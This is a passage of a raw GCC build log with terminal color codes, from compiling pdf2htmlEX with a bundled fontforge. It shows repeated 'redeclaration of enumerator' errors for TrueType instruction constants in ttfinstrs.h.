                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:29:52:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_pushw[m[K’ was here
  ttf_npushb=0x40, ttf_npushw=0x41, ttf_pushb=0xb0, [01;36m[Kttf_pushw[m[K=0xb8,
                                                    [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:30:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_aa[m[K’
  [01;31m[Kttf_aa[m[K=0x7f, ttf_abs=0x64, ttf_add=0x60, ttf_alignpts=0x27, ttf_alignrp=0x3c,
  [01;31m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:30:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_aa[m[K’ was here
  [01;36m[Kttf_aa[m[K=0x7f, ttf_abs=0x64, ttf_add=0x60, ttf_alignpts=0x27, ttf_alignrp=0x3c,
  [01;36m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:30:15:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_abs[m[K’
  ttf_aa=0x7f, [01;31m[Kttf_abs[m[K=0x64, ttf_add=0x60, ttf_alignpts=0x27, ttf_alignrp=0x3c,
               [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:30:15:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_abs[m[K’ was here
  ttf_aa=0x7f, [01;36m[Kttf_abs[m[K=0x64, ttf_add=0x60, ttf_alignpts=0x27, ttf_alignrp=0x3c,
               [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:30:29:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_add[m[K’
  ttf_aa=0x7f, ttf_abs=0x64, [01;31m[Kttf_add[m[K=0x60, ttf_alignpts=0x27, ttf_alignrp=0x3c,
                             [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:30:29:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_add[m[K’ was here
  ttf_aa=0x7f, ttf_abs=0x64, [01;36m[Kttf_add[m[K=0x60, ttf_alignpts=0x27, ttf_alignrp=0x3c,
                             [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:30:43:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_alignpts[m[K’
  ttf_aa=0x7f, ttf_abs=0x64, ttf_add=0x60, [01;31m[Kttf_alignpts[m[K=0x27, ttf_alignrp=0x3c,
                                           [01;31m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:30:43:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_alignpts[m[K’ was here
  ttf_aa=0x7f, ttf_abs=0x64, ttf_add=0x60, [01;36m[Kttf_alignpts[m[K=0x27, ttf_alignrp=0x3c,
                                           [01;36m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:30:62:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_alignrp[m[K’
  ttf_aa=0x7f, ttf_abs=0x64, ttf_add=0x60, ttf_alignpts=0x27, [01;31m[Kttf_alignrp[m[K=0x3c,
                                                              [01;31m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:30:62:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_alignrp[m[K’ was here
  ttf_aa=0x7f, ttf_abs=0x64, ttf_add=0x60, ttf_alignpts=0x27, [01;36m[Kttf_alignrp[m[K=0x3c,
                                                              [01;36m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:31:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_and[m[K’
  [01;31m[Kttf_and[m[K=0x5a, ttf_call=0x2b, ttf_ceiling=0x67, ttf_cindex=0x25, ttf_clear=0x22,
  [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:31:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_and[m[K’ was here
  [01;36m[Kttf_and[m[K=0x5a, ttf_call=0x2b, ttf_ceiling=0x67, ttf_cindex=0x25, ttf_clear=0x22,
  [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:31:16:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_call[m[K’
  ttf_and=0x5a, [01;31m[Kttf_call[m[K=0x2b, ttf_ceiling=0x67, ttf_cindex=0x25, ttf_clear=0x22,
                [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:31:16:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_call[m[K’ was here
  ttf_and=0x5a, [01;36m[Kttf_call[m[K=0x2b, ttf_ceiling=0x67, ttf_cindex=0x25, ttf_clear=0x22,
                [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:31:31:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_ceiling[m[K’
  ttf_and=0x5a, ttf_call=0x2b, [01;31m[Kttf_ceiling[m[K=0x67, ttf_cindex=0x25, ttf_clear=0x22,
                               [01;31m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:31:31:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_ceiling[m[K’ was here
  ttf_and=0x5a, ttf_call=0x2b, [01;36m[Kttf_ceiling[m[K=0x67, ttf_cindex=0x25, ttf_clear=0x22,
                               [01;36m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:31:49:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_cindex[m[K’
  ttf_and=0x5a, ttf_call=0x2b, ttf_ceiling=0x67, [01;31m[Kttf_cindex[m[K=0x25, ttf_clear=0x22,
                                                 [01;31m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:31:49:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_cindex[m[K’ was here
  ttf_and=0x5a, ttf_call=0x2b, ttf_ceiling=0x67, [01;36m[Kttf_cindex[m[K=0x25, ttf_clear=0x22,
                                                 [01;36m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:31:66:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_clear[m[K’
  ttf_and=0x5a, ttf_call=0x2b, ttf_ceiling=0x67, ttf_cindex=0x25, [01;31m[Kttf_clear[m[K=0x22,
                                                                  [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:31:66:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_clear[m[K’ was here
  ttf_and=0x5a, ttf_call=0x2b, ttf_ceiling=0x67, ttf_cindex=0x25, [01;36m[Kttf_clear[m[K=0x22,
                                                                  [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:32:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_debug[m[K’
  [01;31m[Kttf_debug[m[K=0x4f, ttf_deltac1=0x73, ttf_deltac2=0x74, ttf_deltac3=0x75,
  [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:32:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_debug[m[K’ was here
  [01;36m[Kttf_debug[m[K=0x4f, ttf_deltac1=0x73, ttf_deltac2=0x74, ttf_deltac3=0x75,
  [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:32:18:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_deltac1[m[K’
  ttf_debug=0x4f, [01;31m[Kttf_deltac1[m[K=0x73, ttf_deltac2=0x74, ttf_deltac3=0x75,
                  [01;31m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:32:18:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_deltac1[m[K’ was here
  ttf_debug=0x4f, [01;36m[Kttf_deltac1[m[K=0x73, ttf_deltac2=0x74, ttf_deltac3=0x75,
                  [01;36m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:32:36:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_deltac2[m[K’
  ttf_debug=0x4f, ttf_deltac1=0x73, [01;31m[Kttf_deltac2[m[K=0x74, ttf_deltac3=0x75,
                                    [01;31m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:32:36:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_deltac2[m[K’ was here
  ttf_debug=0x4f, ttf_deltac1=0x73, [01;36m[Kttf_deltac2[m[K=0x74, ttf_deltac3=0x75,
                                    [01;36m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:32:54:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_deltac3[m[K’
  ttf_debug=0x4f, ttf_deltac1=0x73, ttf_deltac2=0x74, [01;31m[Kttf_deltac3[m[K=0x75,
                                                      [01;31m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:32:54:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_deltac3[m[K’ was here
  ttf_debug=0x4f, ttf_deltac1=0x73, ttf_deltac2=0x74, [01;36m[Kttf_deltac3[m[K=0x75,
                                                      [01;36m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:33:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_deltap1[m[K’
  [01;31m[Kttf_deltap1[m[K=0x5d, ttf_deltap2=0x71, ttf_deltap3=0x72, ttf_depth=0x24,
  [01;31m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:33:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_deltap1[m[K’ was here
  [01;36m[Kttf_deltap1[m[K=0x5d, ttf_deltap2=0x71, ttf_deltap3=0x72, ttf_depth=0x24,
  [01;36m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:33:20:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_deltap2[m[K’
  ttf_deltap1=0x5d, [01;31m[Kttf_deltap2[m[K=0x71, ttf_deltap3=0x72, ttf_depth=0x24,
                    [01;31m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:33:20:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_deltap2[m[K’ was here
  ttf_deltap1=0x5d, [01;36m[Kttf_deltap2[m[K=0x71, ttf_deltap3=0x72, ttf_depth=0x24,
                    [01;36m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:33:38:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_deltap3[m[K’
  ttf_deltap1=0x5d, ttf_deltap2=0x71, [01;31m[Kttf_deltap3[m[K=0x72, ttf_depth=0x24,
                                      [01;31m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:33:38:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_deltap3[m[K’ was here
  ttf_deltap1=0x5d, ttf_deltap2=0x71, [01;36m[Kttf_deltap3[m[K=0x72, ttf_depth=0x24,
                                      [01;36m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:33:56:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_depth[m[K’
  ttf_deltap1=0x5d, ttf_deltap2=0x71, ttf_deltap3=0x72, [01;31m[Kttf_depth[m[K=0x24,
                                                        [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:33:56:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_depth[m[K’ was here
  ttf_deltap1=0x5d, ttf_deltap2=0x71, ttf_deltap3=0x72, [01;36m[Kttf_depth[m[K=0x24,
                                                        [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:34:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_div[m[K’
  [01;31m[Kttf_div[m[K=0x62, ttf_dup=0x20, ttf_eif=0x59, ttf_else=0x1b, ttf_endf=0x2d,
  [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:34:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_div[m[K’ was here
  [01;36m[Kttf_div[m[K=0x62, ttf_dup=0x20, ttf_eif=0x59, ttf_else=0x1b, ttf_endf=0x2d,
  [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:34:16:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_dup[m[K’
  ttf_div=0x62, [01;31m[Kttf_dup[m[K=0x20, ttf_eif=0x59, ttf_else=0x1b, ttf_endf=0x2d,
                [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:34:16:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_dup[m[K’ was here
  ttf_div=0x62, [01;36m[Kttf_dup[m[K=0x20, ttf_eif=0x59, ttf_else=0x1b, ttf_endf=0x2d,
                [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:34:30:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_eif[m[K’
  ttf_div=0x62, ttf_dup=0x20, [01;31m[Kttf_eif[m[K=0x59, ttf_else=0x1b, ttf_endf=0x2d,
                              [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:34:30:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_eif[m[K’ was here
  ttf_div=0x62, ttf_dup=0x20, [01;36m[Kttf_eif[m[K=0x59, ttf_else=0x1b, ttf_endf=0x2d,
                              [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:34:44:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_else[m[K’
  ttf_div=0x62, ttf_dup=0x20, ttf_eif=0x59, [01;31m[Kttf_else[m[K=0x1b, ttf_endf=0x2d,
                                            [01;31m[K^~~~~~~~[m[K
